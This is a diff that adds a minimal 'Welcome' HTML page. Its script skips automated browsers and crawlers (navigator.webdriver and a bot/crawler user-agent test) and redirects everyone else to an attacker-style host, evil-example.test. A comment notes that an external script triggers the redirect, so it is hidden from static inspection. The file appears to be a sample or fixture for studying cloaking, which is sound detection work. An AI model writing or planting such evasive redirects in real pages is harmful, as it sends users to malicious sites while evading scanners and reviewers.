@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Welcome</title>
+</head>
+<body>
+<p>Welcome</p>
+<script>
+  function go() {
+    if (navigator.webdriver || /bot|crawler/i.test(navigator.userAgent)) { return; }
+    location.href = "https://real-target.evil-example.test/";
+  }
+  window.startTracking = go;  // called by an external script (not visible statically)
+</script>
+</body>
+</html>
